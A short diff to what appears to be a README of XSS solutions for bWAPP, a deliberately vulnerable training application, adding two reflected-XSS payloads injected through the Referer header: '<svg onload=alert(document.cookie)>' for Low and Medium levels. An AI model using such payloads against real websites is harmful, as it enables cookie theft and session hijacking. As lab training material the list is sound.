@@ -89,6 +89,11 @@ Welcome to the repository of comprehensive solutions for bWAPP's Cross-Site Scri
 # XSS - Reflected (PHP_Self)(High)
 ```Payload – ```
 
+# XSS - Reflected (Referer)(Low)
+```Payload – Referer:<svg onload=alert(document.cookie)>```
 
+# XSS - Reflected (Referer)(Medium)
+```Payload – Referer:<svg onload=alert(document.cookie)>```
 
+  
 
